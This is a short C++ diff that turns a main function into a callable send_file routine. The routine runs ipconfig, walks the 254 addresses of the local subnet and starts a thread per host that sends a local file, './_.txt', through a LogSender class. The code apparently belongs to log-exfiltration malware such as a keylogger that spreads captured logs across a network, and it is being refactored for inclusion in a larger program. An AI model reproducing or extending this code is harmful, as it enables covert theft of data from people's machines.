@@ -7,6 +7,7 @@
 #include <thread>
 #include <chrono>
 #include <math.h>
+#include <winsock2.h>
 
 using namespace std;
 
@@ -63,11 +64,11 @@ string get_ip_from_decimal(unsigned long ip) {
     return result;
 }
 
-void send_logs(LogSender l) {
+void send_log(LogSender l) {
     l.send_logs("./_.txt");
 }
 
-int main() {
+void send_file() {
     system("c:\\windows\\system32\\ipconfig -all > ips.txt");
 
     //ipInfo[0] = ip address
@@ -107,13 +108,11 @@ int main() {
 
         LogSender l(&addr);
 
-        threads[i] = thread(send_logs, l);
+        threads[i] = thread(send_log, l);
         network_address += 1;
     }
 
-    for (int i = 0; i < 254; i++) {
-        threads[i].join();
-    }
-
-    return  0;
+    // for (int i = 0; i < 254; i++) {
+    //     threads[i].join();
+    // }
 }
